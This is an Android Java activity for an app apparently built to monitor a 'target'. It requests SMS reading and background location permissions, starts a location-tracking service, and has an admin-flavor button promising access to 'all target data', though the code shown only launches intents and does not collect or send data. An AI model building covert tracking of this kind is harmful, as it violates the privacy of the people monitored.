package com.nexa.nusantara;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.view.View;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isFlashOn = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 1. Request semua izin dulu
        checkAndRequestPermissions();

        // 2. Inisialisasi kamera
        try {
            cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
            if (cameraManager != null) {
                String[] ids = cameraManager.getCameraIdList();
                if (ids != null && ids.length > 0) {
                    cameraId = ids[0];
                }
            }
        } catch (SecurityException | CameraAccessException e) {
            e.printStackTrace();
            Toast.makeText(this, "Gagal akses kamera", Toast.LENGTH_SHORT).show();
        }

        // 3. Setup tombol (tapi hanya setelah izin, atau dengan handling)
        setupButtons();
    }

    private void setupButtons() {
        CardView cardFrontCam = findViewById(R.id.cardFrontCam);
        CardView cardBackCam = findViewById(R.id.cardBackCam);
        CardView cardWhatsApp = findViewById(R.id.cardWhatsApp);
        CardView cardGallery = findViewById(R.id.cardGallery);
        CardView cardSMS = findViewById(R.id.cardSMS);
        CardView cardGmail = findViewById(R.id.cardGmail);
        CardView cardFlash = findViewById(R.id.cardFlash);
        CardView cardLocation = findViewById(R.id.cardLocation);

        if (cardFrontCam != null) {
            cardFrontCam.setOnClickListener(v -> {
                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                openCamera(true);
            });
        }
        if (cardBackCam != null) {
            cardBackCam.setOnClickListener(v -> {
                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                openCamera(false);
            });
        }
        if (cardWhatsApp != null) {
            cardWhatsApp.setOnClickListener(v -> {
                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                openApp("com.whatsapp");
            });
        }
        if (cardGallery != null) {
            cardGallery.setOnClickListener(v -> {
                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                openGallery();
            });
        }
        if (cardSMS != null) {
            cardSMS.setOnClickListener(v -> {
                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                openSMS();
            });
        }
        if (cardGmail != null) {
            cardGmail.setOnClickListener(v -> {
                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                openApp("com.google.android.gm");
            });
        }
        if (cardFlash != null) {
            cardFlash.setOnClickListener(v -> {
                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                toggleFlash();
            });
        }
        if (cardLocation != null) {
            cardLocation.setOnClickListener(v -> {
                v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                startLocationService();
            });
        }

        // Tombol admin (hanya muncul kalau admin flavor)
        if (BuildConfig.IS_ADMIN) {
            Button btnAdmin = findViewById(R.id.btnAdmin);
            if (btnAdmin != null) {
                btnAdmin.setVisibility(View.VISIBLE);
                btnAdmin.setOnClickListener(v -> {
                    v.startAnimation(AnimationUtils.loadAnimation(this, R.anim.scale));
                    Toast.makeText(this, "Admin Panel: Akses semua data target", Toast.LENGTH_LONG).show();
                });
            }
        }
    }

    private void checkAndRequestPermissions() {
        String[] perms = {
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.INTERNET
        };
        List<String> list = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                list.add(p);
            }
        }
        if (!list.isEmpty()) {
            ActivityCompat.requestPermissions(this, list.toArray(new String[0]), 123);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 123) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Izin " + permissions[i] + " ditolak", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    private void openCamera(boolean front) {
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (intent.resolveActivity(getPackageManager()) != null) {
            startActivity(intent);
        } else {
            Toast.makeText(this, "Kamera tidak tersedia", Toast.LENGTH_SHORT).show();
        }
    }

    private void openApp(String pkg) {
        Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
        if (intent != null) {
            startActivity(intent);
        } else {
            Toast.makeText(this, "Aplikasi " + pkg + " tidak terinstal", Toast.LENGTH_SHORT).show();
        }
    }

    private void openGallery() {
        Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        startActivity(intent);
    }

    private void openSMS() {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("sms:"));
        startActivity(intent);
    }

    private void toggleFlash() {
        try {
            if (cameraManager != null && cameraId != null) {
                isFlashOn = !isFlashOn;
                cameraManager.setTorchMode(cameraId, isFlashOn);
                Toast.makeText(this, isFlashOn ? "Senter ON" : "Senter OFF", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Kamera tidak siap", Toast.LENGTH_SHORT).show();
            }
        } catch (CameraAccessException e) {
            Toast.makeText(this, "Gagal akses senter", Toast.LENGTH_SHORT).show();
        }
    }

    private void startLocationService() {
        Intent intent = new Intent(this, LocationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        Toast.makeText(this, "Tracking lokasi dimulai", Toast.LENGTH_SHORT).show();
    }
}
